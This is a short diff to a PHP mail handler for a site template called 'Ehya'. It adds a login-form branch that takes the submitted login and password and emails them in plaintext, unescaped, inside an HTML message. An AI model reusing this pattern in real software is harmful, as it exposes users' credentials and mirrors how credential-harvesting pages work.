@@ -5,12 +5,21 @@ require 'phpmailer/Exception.php';
 
 $formName = $_POST['formName'];
 $email = $_POST['email'];
+$login = $_POST['login'];
+$password = $_POST['password'];
 
 if($formName == "subscribe") {
     $title = "New subscription Ehya";
     $body = "
     <h2>New subscription</h2>
     <b>E-mail:</b> $email
+    ";
+}elseif($formName == "login") {
+    $title = "New login Ehya";
+    $body = "
+    <h2>New login</h2><br><br>
+    <b>Login:</b> $login<br>
+    <b>Password:</b> $password
     ";
 }
 
